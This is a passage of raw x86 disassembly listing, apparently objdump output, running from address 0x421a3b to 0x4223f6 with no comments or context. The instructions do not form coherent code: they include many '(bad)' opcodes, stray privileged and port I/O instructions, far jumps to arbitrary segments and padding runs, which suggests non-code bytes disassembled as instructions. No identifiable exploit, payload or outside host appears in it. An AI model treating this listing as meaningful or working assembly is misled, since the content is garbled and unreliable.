  421a3b:	sub    DWORD PTR [edx+0x79],esp
  421a3e:	or     eax,0x9f9e248b
  421a43:	dec    BYTE PTR fs:[ecx+ebp*1+0x6b398462]
  421a4b:	sbb    ah,BYTE PTR [ecx-0x3b07956a]
  421a51:	ja     0x4219f2
  421a53:	sbb    al,0xdb
  421a55:	aad    0x77
  421a57:	shr    ch,1
  421a59:	cld    
  421a5a:	pop    ss
  421a5b:	loopne 0x421abc
  421a5d:	gs into 
  421a5f:	adc    DWORD PTR [ebx-0x18],ebx
  421a62:	jle    0x421a49
  421a64:	aas    
  421a65:	daa    
  421a66:	xchg   ebp,eax
  421a67:	xchg   esp,eax
  421a68:	repz arpl WORD PTR [ecx-0x133e2f50],di
  421a6f:	inc    edx
  421a70:	push   es
  421a71:	mov    ecx,DWORD PTR [esi+0x5e]
  421a74:	adc    edx,ecx
  421a76:	shr    BYTE PTR [ebx-0x7e],1
  421a79:	iret   
  421a7a:	daa    
  421a7b:	shl    BYTE PTR [edi+0x4],0x20
  421a7f:	adc    eax,0x23d976cb
  421a84:	cli    
  421a85:	call   0xa4cd:0xcf398632
  421a8c:	push   cs
  421a8d:	mov    esi,0xdb74da6c
  421a92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a93:	scas   al,BYTE PTR es:[edi]
  421a94:	(bad)  
  421a95:	rcl    BYTE PTR [ebx+0xf3d7e40],1
  421a9b:	xchg   ecx,eax
  421a9c:	xchg   edi,ebx
  421a9e:	dec    ebp
  421a9f:	test   DWORD PTR [edx-0x4e],0x41a9c5ec
  421aa6:	jo     0x421ad1
  421aa8:	xchg   edi,eax
  421aa9:	sbb    BYTE PTR [eax-0x5a],cl
  421aac:	inc    esi
  421aad:	pop    edx
  421aae:	jmp    0x32ef:0x23ada33b
  421ab5:	adc    al,0xd6
  421ab7:	jle    0x421afc
  421ab9:	cmp    DWORD PTR [ecx-0x73],esp
  421abc:	rcl    BYTE PTR [ebx-0x7e7ed290],1
  421ac2:	jl     0x421af7
  421ac4:	or     bh,0x91
  421ac7:	sub    al,0x84
  421ac9:	retf   
  421aca:	loopne 0x421b3b
  421acc:	jmp    0x6372a7fc
  421ad1:	loopne 0x421b34
  421ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ad4:	and    DWORD PTR ds:0x1209a66d,esp
  421ada:	push   eax
  421adb:	lods   al,BYTE PTR ds:[esi]
  421adc:	or     al,0x6d
  421ade:	fld    DWORD PTR [esp+esi*2+0x6f]
  421ae2:	xchg   ecx,eax
  421ae3:	push   esi
  421ae4:	(bad)  
  421ae5:	subps  xmm1,XMMWORD PTR [ebx]
  421ae8:	out    dx,al
  421ae9:	aaa    
  421aea:	mov    al,ds:0x4f7de9
  421aef:	or     edi,DWORD PTR [ecx+esi*1]
  421af2:	stos   DWORD PTR es:[edi],eax
  421af3:	sar    BYTE PTR [edx],0xae
  421af6:	mov    ds:0x985d5c6a,al
  421afb:	div    al
  421afd:	fxtract 
  421aff:	call   DWORD PTR [edx-0x51b85e6a]
  421b05:	jnp    0x421b1b
  421b07:	ret    0x3f5
  421b0a:	std    
  421b0b:	mov    cl,0x25
  421b0d:	cs stos DWORD PTR es:[edi],eax
  421b0f:	cmp    DWORD PTR [eax],eax
	...
  421b71:	add    BYTE PTR [eax],al
  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dl,ch
  421b81:	mov    edi,0x6728a1ad
  421b86:	add    DWORD PTR [eax],eax
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	test   BYTE PTR [ebx-0x828a59b],ah
  421b92:	mov    WORD PTR ds:0xff77c162,gs
  421b98:	add    dl,BYTE PTR [esi]
  421b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b9b:	sbb    al,0xa4
  421b9d:	leave  
  421b9e:	in     eax,0xdc
  421ba0:	dec    edx
  421ba1:	pop    eax
  421ba2:	xchg   DWORD PTR [esi-0x62c088f],edx
  421ba8:	xchg   ecx,eax
  421ba9:	sub    BYTE PTR [esi],bl
  421bab:	dec    esi
  421bac:	add    al,0x2b
  421bae:	cmp    edx,DWORD PTR [edi-0x44]
  421bb1:	mov    edx,0x75f18fd4
  421bb6:	inc    edx
  421bb7:	iret   
  421bb8:	or     eax,0xa12ab1b9
  421bbd:	jb     0x421b60
  421bbf:	or     al,0xf5
  421bc1:	mov    ah,0x88
  421bc3:	call   0x539a:0xe14a84cf
  421bca:	push   esp
  421bcb:	fistp  DWORD PTR [ebx+0x68]
  421bce:	ins    BYTE PTR es:[edi],dx
  421bcf:	(bad)  
  421bd0:	neg    DWORD PTR [edi]
  421bd2:	nop
  421bd3:	(bad)  
  421bd4:	push   ebp
  421bd5:	ins    BYTE PTR es:[edi],dx
  421bd6:	out    dx,eax
  421bd7:	or     BYTE PTR [esi],0xf4
  421bda:	adc    ecx,edi
  421bdc:	test   al,0xf3
  421bde:	jb     0x421c03
  421be0:	mov    ecx,0x90592bc9
  421be5:	cld    
  421be6:	push   ds
  421be7:	mov    dl,BYTE PTR [edx+0x78]
  421bea:	lods   al,BYTE PTR ds:[esi]
  421beb:	jle    0x421bc2
  421bed:	adc    BYTE PTR [edi-0x39b05d54],al
  421bf3:	xchg   esi,eax
  421bf4:	es inc ebp
  421bf6:	push   ds
  421bf7:	pop    ds
  421bf8:	ror    BYTE PTR [ecx+0x7de18a3d],0x1c
  421bff:	and    DWORD PTR [edx+0x7f],ebp
  421c02:	or     DWORD PTR [ebx+0x5c],edi
  421c05:	sub    ecx,DWORD PTR [ebx+0x23fc71d4]
  421c0b:	cli    
  421c0c:	cmc    
  421c0d:	out    0xe6,eax
  421c0f:	mov    eax,esp
  421c11:	xor    al,BYTE PTR [esi-0x3c]
  421c14:	inc    ecx
  421c15:	dec    eax
  421c16:	fldenv [edi-0x9472467]
  421c1c:	ret    
  421c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c1e:	dec    ebp
  421c1f:	xchg   ebx,eax
  421c20:	mov    cl,BYTE PTR [edi]
  421c22:	adc    DWORD PTR [ebp-0x9],edi
  421c25:	call   0x3e1c:0x7548980c
  421c2c:	shl    esp,0xa6
  421c2f:	inc    ecx
  421c30:	mov    dh,0x41
  421c32:	sar    ecx,cl
  421c34:	in     al,dx
  421c35:	(bad)  
  421c36:	sub    al,0xd4
  421c38:	jne    0x421c73
  421c3a:	mov    al,ds:0x90784998
  421c3f:	pop    edi
  421c40:	ins    BYTE PTR es:[edi],dx
  421c41:	aas    
  421c42:	clc    
  421c43:	fidivr DWORD PTR [edi+esi*8]
  421c46:	lds    esi,FWORD PTR [edi+eiz*1]
  421c49:	sti    
  421c4a:	fdivp  st(0),st
  421c4c:	ror    DWORD PTR [edi-0x61eeaebf],cl
  421c52:	pop    edi
  421c53:	mov    DWORD PTR [eax],0x136ea960
  421c59:	jo     0x421c32
  421c5b:	lods   al,BYTE PTR ds:[esi]
  421c5c:	(bad)  
  421c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c5e:	mov    edi,0xed5876ec
  421c63:	mov    DWORD PTR [ecx+ebp*4],esp
  421c66:	jmp    0x421bf8
  421c68:	jecxz  0x421cbb
  421c6a:	sub    BYTE PTR [esi-0xf164dd7],dh
  421c70:	add    ebx,DWORD PTR [esi-0x2aba1671]
  421c76:	into   
  421c77:	xlat   BYTE PTR ds:[ebx]
  421c78:	rol    DWORD PTR [esi],cl
  421c7a:	xor    eax,0x37ae635
  421c7f:	(bad)  
  421c80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c81:	sbb    ah,BYTE PTR [ecx]
  421c83:	mov    ebp,0xba46759f
  421c88:	mov    WORD PTR [edx],ds
  421c8a:	push   edx
  421c8b:	fild   DWORD PTR [eax+0x60]
  421c8e:	mov    eax,0xd0
	...
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	dec    ecx
  421d01:	xor    ax,0x2cb2
  421d05:	push   0x1040001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	push   cs
  421d0d:	inc    esp
  421d0e:	push   ss
  421d0f:	(bad)  
  421d10:	xchg   edx,eax
  421d11:	mov    esi,0x58723c42
  421d16:	hlt    
  421d17:	adc    esi,ecx
  421d19:	lahf   
  421d1a:	xchg   esi,eax
  421d1b:	dec    esp
  421d1c:	mov    edi,0x26bf9008
  421d21:	pop    ebp
  421d22:	and    eax,0x91cf576a
  421d27:	xchg   esp,eax
  421d28:	jnp    0x421d33
  421d2a:	test   DWORD PTR [esi],0x24326892
  421d30:	adc    DWORD PTR [edx],eax
  421d32:	stos   BYTE PTR es:[edi],al
  421d33:	bound  ebx,QWORD PTR [eax]
  421d35:	into   
  421d36:	cli    
  421d37:	dec    eax
  421d38:	jb     0x421d1a
  421d3a:	cmp    BYTE PTR [eax-0x526c2cc],bl
  421d40:	pop    esi
  421d42:	sti    
  421d43:	nop
  421d44:	mov    bh,0x3a
  421d46:	(bad)  
  421d48:	loopne 0x421cd9
  421d4a:	sar    BYTE PTR [edi],cl
  421d4c:	(bad)  
  421d4d:	pop    esi
  421d4e:	mov    bh,0xac
  421d50:	push   ecx
  421d51:	fld    DWORD PTR [ecx-0x549b7a12]
  421d57:	push   0x0
  421d59:	xor    ebx,0xfffffffc
  421d5c:	push   ebp
  421d5d:	jns    0x421ddd
  421d5f:	call   0x37e2:0xc0c64ddd
  421d66:	sbb    al,0xd6
  421d68:	pop    edi
  421d69:	iret   
  421d6a:	in     eax,0x8b
  421d6c:	jp     0x421d00
  421d6e:	push   ss
  421d6f:	sbb    dh,BYTE PTR [ebp-0x32]
  421d72:	fbstp  TBYTE PTR [ebx+0x45]
  421d75:	add    eax,0x27ae3142
  421d7a:	jae    0x421dba
  421d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d7d:	ret    
  421d7e:	mov    DWORD PTR [ecx+0x3],esi
  421d81:	push   ds
  421d82:	imul   ecx,DWORD PTR [edx],0xde20092f
  421d88:	mov    ecx,0x32ab4249
  421d8d:	push   0xffffffad
  421d8f:	imul   ebx,DWORD PTR gs:[ebx+0x6],0xbc556bcc
  421d97:	pop    DWORD PTR [edx+eiz*8]
  421d9a:	mov    dh,0x53
  421d9c:	jmp    0xa48c3621
  421da1:	or     esp,0x3b6007e6
  421da7:	xor    BYTE PTR [ebx+esi*8+0x36],ch
  421dab:	in     eax,0xfd
  421dad:	push   0xffffffe9
  421daf:	in     al,dx
  421db0:	scas   eax,DWORD PTR es:[edi]
  421db1:	push   ds
  421db2:	xchg   esi,eax
  421db3:	gs popf 
  421db5:	xchg   edx,eax
  421db6:	lds    ebp,FWORD PTR [ebx-0x74]
  421db9:	push   ecx
  421dba:	mov    cl,0xde
  421dbc:	mov    ebx,0x5c30b622
  421dc1:	xchg   BYTE PTR [edi],dh
  421dc3:	push   cs
  421dc4:	ret    
  421dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dc6:	inc    esp
  421dc7:	jno    0x421dd1
  421dc9:	fild   QWORD PTR [esi]
  421dcb:	sbb    BYTE PTR cs:[eax],dh
  421dce:	mov    al,ds:0x8a80f65
  421dd3:	and    al,0x92
  421dd5:	xchg   edx,eax
  421dd6:	push   ebx
  421dd7:	xchg   ecx,eax
  421dd8:	in     eax,dx
  421dd9:	clc    
  421dda:	stos   BYTE PTR es:[edi],al
  421ddb:	and    BYTE PTR [edx+0x39],bl
  421dde:	xchg   ecx,eax
  421ddf:	mov    ebx,0x35a287b9
  421de4:	dec    ebp
  421de5:	mov    al,ds:0x85feb680
  421dea:	sbb    edx,0xffffff90
  421ded:	clc    
  421dee:	or     DWORD PTR [esp+eax*1-0x26f6f4c8],esi
  421df5:	jbe    0x421e3a
  421df7:	inc    ebp
  421df8:	sub    BYTE PTR [esi+0x6d],ch
  421dfb:	sar    DWORD PTR [ecx-0x62],cl
  421dfe:	sbb    eax,0x974d4c68
  421e03:	call   0x9602af0c
  421e08:	icebp  
  421e09:	btc    DWORD PTR [ecx+0x65],ecx
  421e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e0e:	jnp    0x421e08
	...
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	fcomp  DWORD PTR [edx]
  421e83:	or     al,0x30
  421e85:	imul   eax,DWORD PTR [ecx],0x10400
  421e8b:	add    BYTE PTR [edi-0x60056362],bh
  421e91:	mov    BYTE PTR [edi+0x47],0xdd
  421e95:	mov    ebx,0x3e100beb
  421e9a:	mov    ss,WORD PTR [edi]
  421e9c:	into   
  421e9d:	xor    edi,DWORD PTR [esi-0x7204421a]
  421ea3:	(bad)  
  421ea4:	jg     0x421e95
  421ea6:	das    
  421ea7:	sbb    bl,BYTE PTR [ebx+eiz*2+0x21]
  421eab:	cli    
  421eac:	xlat   BYTE PTR ds:[ebx]
  421ead:	fidiv  DWORD PTR [edi-0x3f]
  421eb0:	ins    BYTE PTR es:[edi],dx
  421eb1:	or     DWORD PTR ds:[esi-0x3bdf6a74],0x24
  421eb9:	inc    ebx
  421eba:	mov    esp,0xf4cd3b69
  421ebf:	dec    esi
  421ec0:	inc    ecx
  421ec1:	mov    ah,0x7f
  421ec3:	dec    esi
  421ec4:	and    BYTE PTR [ebx],0x5c
  421ec7:	inc    ebp
  421ec8:	int    0x9b
  421eca:	das    
  421ecb:	fst    DWORD PTR [ebx]
  421ecd:	adc    BYTE PTR [esi+0x20f41d47],al
  421ed3:	aas    
  421ed4:	out    0x41,al
  421ed6:	gs icebp 
  421ed8:	cmp    dl,BYTE PTR [esi-0x30b943f8]
  421ede:	sahf   
  421edf:	jge    0x421f45
  421ee1:	ror    DWORD PTR [ecx],1
  421ee3:	push   0x5551c39
  421ee8:	or     BYTE PTR [eax+0x64],al
  421eeb:	dec    ebx
  421eec:	mov    eax,0x48761321
  421ef1:	(bad)  
  421ef2:	inc    ebp
  421ef3:	sar    DWORD PTR [edi-0x59],0x13
  421ef7:	mov    ebp,0xd9ddf677
  421efc:	jmp    0xe49865fa
  421f01:	stc    
  421f02:	pop    esi
  421f03:	sub    al,0x88
  421f05:	or     eax,0xafcfbc5
  421f0a:	push   esi
  421f0b:	inc    esi
  421f0c:	call   0x9d8a8c3c
  421f11:	retf   
  421f12:	ror    bl,cl
  421f14:	mov    BYTE PTR [edx],al
  421f16:	push   0xffffffc5
  421f18:	push   ebp
  421f19:	in     al,dx
  421f1a:	scas   eax,DWORD PTR es:[edi]
  421f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f1c:	xchg   esi,eax
  421f1d:	push   cs
  421f1e:	in     eax,dx
  421f1f:	int    0x3a
  421f21:	out    0xf8,al
  421f23:	dec    ebp
  421f24:	and    BYTE PTR ds:0xee3a4127,ch
  421f2a:	cmp    ch,BYTE PTR [ebp+eiz*1-0x26]
  421f2e:	push   ecx
  421f2f:	add    al,0xbc
  421f31:	xor    DWORD PTR [edx+0x45f0486a],esi
  421f37:	dec    edi
  421f38:	sbb    edi,edx
  421f3a:	jmp    0x90c6:0x8e9a1b5d
  421f41:	mov    ds:0x7e01ef42,eax
  421f46:	(bad)  
  421f47:	dec    ecx
  421f48:	aaa    
  421f49:	xor    ah,bl
  421f4b:	inc    ecx
  421f4c:	out    0x6c,al
  421f4e:	into   
  421f4f:	lahf   
  421f50:	stc    
  421f51:	loope  0x421f09
  421f53:	mov    esp,0x194ff3d9
  421f58:	(bad)  
  421f59:	loopne 0x421f00
  421f5b:	xor    bl,BYTE PTR [esi]
  421f5d:	(bad)  
  421f5e:	cdq    
  421f5f:	dec    esp
  421f60:	sbb    al,dl
  421f62:	mov    eax,ds:0x2e553a47
  421f67:	inc    ecx
  421f68:	push   ebx
  421f69:	cmp    esi,DWORD PTR [ebx]
  421f6b:	inc    eax
  421f6c:	retf   
  421f6d:	dec    esi
  421f6e:	in     al,0xec
  421f70:	jl     0x421fdd
  421f72:	cli    
  421f73:	sub    al,0x67
  421f75:	adc    BYTE PTR ds:0xa4b8e,ah
  421f7b:	mov    esp,0x76b116d9
  421f80:	or     al,0x15
  421f82:	xlat   BYTE PTR ds:[ebx]
  421f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f84:	ds or  edi,eax
  421f87:	mov    eax,0x1b53a5d3
  421f8c:	pop    ss
  421f8d:	jge    0x421fdd
  421f8f:	jle    0x421f91
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	popaw  
  422001:	dec    ecx
  422002:	and    ecx,DWORD PTR [ecx]
  422004:	xor    al,0x6a
  422006:	add    DWORD PTR [eax],eax
  422008:	add    al,0x1
  42200a:	add    BYTE PTR [eax],al
  42200c:	add    al,0x31
  42200e:	push   0x5c24a52c
  422013:	(bad)  
  422014:	or     eax,DWORD PTR [eax-0x15aeeae8]
  42201a:	add    DWORD PTR [ecx],0xffffffd8
  42201d:	test   eax,0xcee3f888
  422022:	les    ebx,FWORD PTR [esi]
  422024:	int    0x26
  422026:	pop    DWORD PTR [edx]
  422028:	outs   dx,DWORD PTR ds:[esi]
  422029:	dec    esi
  42202a:	mov    ds:0x4ac42b1d,eax
  42202f:	adc    esi,DWORD PTR [edx-0x2]
  422032:	pushf  
  422033:	inc    eax
  422034:	xchg   ebp,eax
  422035:	inc    esi
  422036:	dec    ebx
  422037:	xchg   esp,eax
  422038:	aad    0x9e
  42203a:	daa    
  42203b:	xor    DWORD PTR [edx+edi*8],edi
  42203e:	pop    esi
  42203f:	adc    DWORD PTR [ebx-0x24],esi
  422042:	dec    esi
  422043:	or     ebp,DWORD PTR [edi+0x41c0b69e]
  422049:	cs mov ah,0x5b
  42204c:	cs xchg ebx,eax
  42204e:	mov    dh,0x40
  422050:	cmpps  xmm7,XMMWORD PTR [edi-0x77],0xb8
  422055:	mov    edi,0xad9efa93
  42205a:	iret   
  42205b:	or     al,ch
  42205d:	(bad)  
  42205e:	or     al,0x2f
  422060:	out    dx,al
  422061:	jno    0x422020
  422063:	loope  0x4220c9
  422065:	iret   
  422066:	inc    esi
  422067:	fidivr DWORD PTR [ebx-0x39]
  42206a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42206b:	rcl    dl,0xb3
  42206e:	xchg   esi,eax
  42206f:	pop    ds
  422070:	mov    DWORD PTR [ebx+0x3e],edi
  422073:	push   ebx
  422074:	out    0x71,eax
  422076:	inc    esp
  422077:	test   BYTE PTR [edx],bl
  422079:	rcr    DWORD PTR ds:0x54a7179d,1
  42207f:	hlt    
  422080:	inc    ebp
  422081:	cli    
  422082:	push   esi
  422083:	push   ebx
  422084:	(bad)  
  422085:	and    eax,0x130f2efb
  42208a:	out    dx,al
  42208b:	cmc    
  42208c:	popf   
  42208d:	ss xchg edi,eax
  42208f:	add    DWORD PTR [esi+0x31],edx
  422092:	mov    al,0xb3
  422094:	adc    eax,0xd6e813bf
  422099:	in     al,0xf5
  42209b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42209c:	jo     0x422074
  42209e:	jo     0x4220f3
  4220a0:	dec    ebp
  4220a1:	adc    al,0x69
  4220a3:	push   0x93220beb
  4220a8:	xor    eax,0x9f9aab14
  4220ad:	cli    
  4220ae:	inc    edi
  4220af:	iret   
  4220b0:	mov    ebp,DWORD PTR [eax]
  4220b2:	jb     0x4220bd
  4220b4:	pusha  
  4220b5:	mov    edx,0x6e0409bf
  4220ba:	mov    dh,0xde
  4220bc:	cmp    bh,ah
  4220be:	mov    BYTE PTR [edx+0x27fe0463],cl
  4220c4:	jns    0x422116
  4220c6:	es out dx,eax
  4220c8:	int    0x1d
  4220ca:	mov    dl,0xe9
  4220cc:	adc    edx,DWORD PTR [esp+0x2d0ab9e5]
  4220d3:	fwait
  4220d4:	add    eax,DWORD PTR [ebx+0x3c436593]
  4220da:	inc    ebx
  4220db:	add    DWORD PTR [ecx+ebp*2+0x22],esp
  4220df:	and    DWORD PTR [edi],0x33c69abb
  4220e5:	adc    esi,eax
  4220e7:	loop   0x422167
  4220e9:	jmp    0x97bb:0xdf0bfbe1
  4220f0:	ret    
  4220f1:	mov    esp,0xca71abe
  4220f6:	in     eax,0xa7
  4220f8:	(bad)  
  4220f9:	jg     0x422141
  4220fb:	inc    ecx
  4220fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220fd:	jb     0x4220a4
  4220ff:	sbb    al,0x51
  422101:	shr    bl,cl
  422103:	(bad)  
  422104:	(bad)  
  422105:	lahf   
  422106:	add    eax,0xb88b6c0
  42210b:	test   DWORD PTR [ebp+0x94b670],ebx
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    edi,DWORD PTR [ebx-0x57]
  422182:	or     eax,0x16b3860
  422187:	add    BYTE PTR [ecx+eax*1],al
  42218a:	add    BYTE PTR [eax],al
  42218c:	and    al,0x81
  42218e:	and    dl,BYTE PTR [esi+0x4e]
  422191:	dec    edx
  422192:	lods   al,BYTE PTR ds:[esi]
  422193:	cmp    ecx,DWORD PTR [esi-0xc]
  422196:	add    DWORD PTR [eax-0x6f96974c],ebp
  42219c:	mov    eax,ds:0xd7f6ef94
  4221a1:	gs popa 
  4221a3:	mov    ebx,0xf936df59
  4221a8:	jae    0x4221e1
  4221aa:	jle    0x422166
  4221ac:	sahf   
  4221ad:	pop    edi
  4221ae:	(bad)  
  4221af:	cmc    
  4221b0:	pop    edi
  4221b1:	mov    ah,BYTE PTR [ecx]
  4221b3:	inc    edi
  4221b4:	xchg   ebx,eax
  4221b5:	mov    ch,0x32
  4221b7:	cli    
  4221b8:	sbb    al,0xc1
  4221ba:	stc    
  4221bb:	jmp    0x422155
  4221bd:	cmp    BYTE PTR [edi+0x1a],cl
  4221c0:	inc    ebx
  4221c1:	test   DWORD PTR [esi-0x79ebfc86],eax
  4221c7:	lods   eax,DWORD PTR ds:[esi]
  4221c8:	cwde   
  4221c9:	imul   ebp,DWORD PTR [edi+0x62],0xfffffff4
  4221cd:	and    ch,BYTE PTR [ebp*8+0x594389bb]
  4221d4:	ds clc 
  4221d6:	mov    esi,0x41451cd6
  4221db:	dec    esi
  4221dc:	push   esi
  4221dd:	sub    edi,DWORD PTR [ebx+ebx*4+0x4994177b]
  4221e4:	add    BYTE PTR [edi],bh
  4221e6:	enter  0x351f,0x73
  4221ea:	add    al,dh
  4221ec:	pushf  
  4221ed:	adc    DWORD PTR [edx],edi
  4221ef:	xlat   BYTE PTR ds:[ebx]
  4221f0:	int    0x4c
  4221f2:	sar    edx,1
  4221f4:	adc    BYTE PTR [ecx],dh
  4221f6:	sbb    DWORD PTR [ecx+eiz*8-0x62],eax
  4221fa:	mov    dl,BYTE PTR [edx]
  4221fc:	shl    BYTE PTR [eax-0x6f],cl
  4221ff:	add    al,0xe9
  422201:	mov    esp,0x23a40f54
  422206:	push   esi
  422207:	jae    0x42226e
  422209:	cmp    al,0xe2
  42220b:	retf   0x31a4
  42220e:	(bad)  
  42220f:	fsubr  QWORD PTR [edx-0x17]
  422212:	mov    ebp,DWORD PTR [eax+ecx*8+0x100bb773]
  422219:	dec    edi
  42221a:	jae    0x42227a
  42221c:	pop    ds
  42221d:	(bad)  
  42221f:	cli    
  422220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422221:	adc    ch,BYTE PTR [eax-0x660b8f5a]
  422227:	cwde   
  422228:	test   al,0xf5
  42222a:	daa    
  42222b:	inc    ebx
  42222c:	repnz int3 
  42222e:	in     al,dx
  42222f:	push   ebx
  422230:	stc    
  422231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422232:	fcom   st(7)
  422234:	aas    
  422235:	sbb    esi,DWORD PTR [edi+0x30]
  422238:	mov    cl,0x96
  42223a:	pushf  
  42223b:	pop    esi
  42223c:	dec    ebp
  42223d:	cmp    al,BYTE PTR [edx+ecx*4]
  422240:	pop    edx
  422241:	pop    ds
  422242:	jbe    0x422246
  422244:	cmp    eax,0x59492071
  422249:	cs pushf 
  42224b:	mov    dh,0x62
  42224d:	mov    esi,0x204a1724
  422252:	or     bl,BYTE PTR [ebx]
  422254:	xor    esi,DWORD PTR [edx-0x6]
  422257:	add    al,0xe4
  422259:	jno    0x422295
  42225b:	pop    ds
  42225c:	sbb    BYTE PTR [esi-0xb],dl
  42225f:	mov    esp,0x56001580
  422264:	push   ebx
  422265:	fadd   QWORD PTR [ecx]
  422267:	call   0x539a0066
  42226c:	(bad)  [eax]
  42226e:	ss mov esp,0x69321487
  422274:	mov    eax,0x657b3631
  422279:	xor    DWORD PTR [ebx+ebx*8],ebx
  42227c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42227d:	cdq    
  42227e:	jecxz  0x422208
  422280:	inc    ecx
  422281:	ss mov bh,0x51
  422284:	out    0xf0,al
  422286:	xchg   cl,dl
  422288:	leave  
  422289:	xchg   esp,eax
  42228a:	fdivrp st(7),st
  42228c:	aaa    
  42228d:	repz push edx
  42228f:	out    0x0,al
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	in     eax,dx
  422301:	push   eax
  422302:	das    
  422303:	fnstsw WORD PTR [esp+ebp*2]
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	fs and eax,0xdacdc386
  422312:	imul   ecx,DWORD PTR [edi],0xffffffa5
  422315:	leave  
  422316:	cmp    ebp,DWORD PTR [ecx]
  422318:	call   0xe286:0x4501671
  42231f:	dec    edx
  422320:	call   0x15bb:0x6c6948be
  422327:	mov    edx,0xb41f57b4
  42232c:	mov    ebx,0x178bf469
  422331:	fnsave [edi]
  422333:	and    al,0xab
  422335:	int    0xe2
  422337:	adc    dh,0xd8
  42233a:	pop    ds
  42233b:	sub    BYTE PTR [edx],0x34
  42233e:	or     eax,0xfd12c3b9
  422343:	out    0xc,eax
  422345:	add    dl,BYTE PTR [ebx]
  422347:	jmp    0x9cf1fe40
  42234c:	test   eax,0x7ce9d4f
  422351:	mov    bh,0xc0
  422353:	mov    ah,0xd7
  422355:	add    BYTE PTR [ebx-0x52],al
  422358:	ficom  WORD PTR [edi+esi*4]
  42235b:	sub    cl,ah
  42235d:	stos   BYTE PTR es:[edi],al
  42235e:	dec    edi
  42235f:	scas   eax,DWORD PTR es:[edi]
  422360:	clc    
  422361:	mov    bl,0xdd
  422363:	push   ecx
  422364:	inc    edx
  422365:	je     0x4223e5
  422367:	fwait
  422368:	mov    ebp,0x4063742e
  42236d:	iret   
  42236e:	lods   eax,DWORD PTR ds:[esi]
  42236f:	or     DWORD PTR [ebx+edi*8-0x6d0c5f97],ebp
  422376:	adc    BYTE PTR [ecx-0x3c018e1a],cl
  42237c:	setnp  BYTE PTR [esi+0x3b817509]
  422383:	jg     0x422376
  422385:	cdq    
  422386:	add    DWORD PTR [edi+0x7000bd22],eax
  42238c:	lods   al,BYTE PTR ds:[esi]
  42238d:	add    DWORD PTR [ecx+0x3f],eax
  422390:	jl     0x4223d2
  422392:	aam    0xc7
  422394:	sahf   
  422395:	test   DWORD PTR [esi],edi
  422397:	sub    al,0xe4
  422399:	sub    al,bh
  42239b:	or     eax,0x6bbab22
  4223a0:	sbb    al,0x70
  4223a2:	jp     0x4223f4
  4223a4:	addr16 pop esp
  4223a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a7:	test   eax,0xa23a8dd2
  4223ac:	inc    ebp
  4223ad:	push   esp
  4223ae:	out    dx,eax
  4223af:	cmp    al,BYTE PTR [edi+0x2bf5d4ab]
  4223b5:	test   DWORD PTR [eax],ecx
  4223b7:	call   0x8a1bd0c3
  4223bc:	sub    bl,BYTE PTR [eax+0x451f5462]
  4223c2:	xor    dh,BYTE PTR [esi]
  4223c4:	mov    ah,0x43
  4223c6:	and    ch,BYTE PTR [esp+eax*2]
  4223c9:	mov    ah,0x94
  4223cb:	scas   al,BYTE PTR es:[edi]
  4223cc:	shr    DWORD PTR [edx],cl
  4223ce:	jl     0x42235c
  4223d0:	gs jge 0x4223ed
  4223d3:	mov    esi,0xd957fb08
  4223d8:	dec    edx
  4223d9:	lea    ecx,[ebx]
  4223db:	and    BYTE PTR [edx],cl
  4223dd:	test   BYTE PTR [esi-0x2f0a3a11],al
  4223e3:	pop    ecx
  4223e4:	push   esi
  4223e5:	ror    BYTE PTR [edx],cl
  4223e7:	cld    
  4223e8:	mov    edx,0x627f2a45
  4223ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223ee:	inc    esi
  4223ef:	pop    edi
  4223f0:	(bad)
  4223f4:	cli    
  4223f5:	stos   BYTE PTR es:[edi],al
  4223f6:	inc    esp
